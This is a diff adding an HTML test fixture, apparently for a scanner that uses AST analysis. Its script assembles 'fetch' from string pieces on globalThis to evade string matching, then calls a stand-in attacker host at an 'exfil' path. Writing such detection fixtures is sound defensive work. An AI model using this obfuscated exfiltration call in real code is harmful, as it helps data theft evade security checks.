@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Obfuscated Computed Fetch Attack</title>
+</head>
+<body>
+  <!-- Attack: Computed property access to bypass simple string matching -->
+  <script>
+    // This should be caught by AST analysis - computed access on globalThis is tracked
+    const fn = globalThis['f' + 'e' + 't' + 'c' + 'h'];
+    fn('https://evil.com/exfil').then(console.log);
+  </script>
+</body>
+</html>
